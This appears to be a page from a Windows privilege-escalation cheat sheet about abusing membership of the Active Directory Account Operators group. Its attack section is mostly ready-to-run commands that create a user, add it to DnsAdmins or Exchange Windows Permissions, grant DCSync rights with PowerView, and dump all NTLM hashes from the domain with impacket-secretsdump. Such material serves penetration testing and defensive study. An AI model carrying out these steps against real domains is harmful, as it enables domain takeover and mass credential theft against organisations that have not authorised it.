# Account Operators

Members of the **Account Operators** group have privileges to manage user account creation. They can create and modify most types of accounts, including user accounts, local groups, and global groups. Additionally, this group has the ability to log on locally to the domain controller. [Learn More](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators)

### Attack

Although a user cannot be added directly as an administrator, there are several alternative privilege escalation techniques. One example is adding a user to the **DNSAdmins** group or granting them **Exchange Windows Permissions**, utilizing the respective escalation techniques.

For DNSAdmins:

```batch
:: Create a new user
net user [user] [password] /add

:: Add user to DNSAdmins
net localgroup "DnsAdmins" [user] /add
```

For Exchange Windows Permissions:

```batch
:: Add user to Exchange Windows Permissions
net group "Exchange Windows Permissions" [user] /add

:: Add DCSync permissions using PowerShell
Import-module .\PowerView.ps1
Add-DomainObjectACL -TargetIdentity 'DC=com,DC=domain' -PrincipalIdentity [user] -Rights DCSync

:: Now extract all NTLM hashes from AD
impacket-secretsdump [domain]/[user]:[password]@[IP]
```

After this, proceed with exploiting either the **DNSAdmins** or **Exchange Windows Permissions** group (you may need to log off and log back in to see the changes).

[↪ DNSAdmins](https://daniel10barredo.github.io/PrivEscAssist_Windows/#groups/DNSAdmins) [↪ Exchange Windows Permissions](https://daniel10barredo.github.io/PrivEscAssist_Windows/#groups/ExchangeWindowsPermissions)
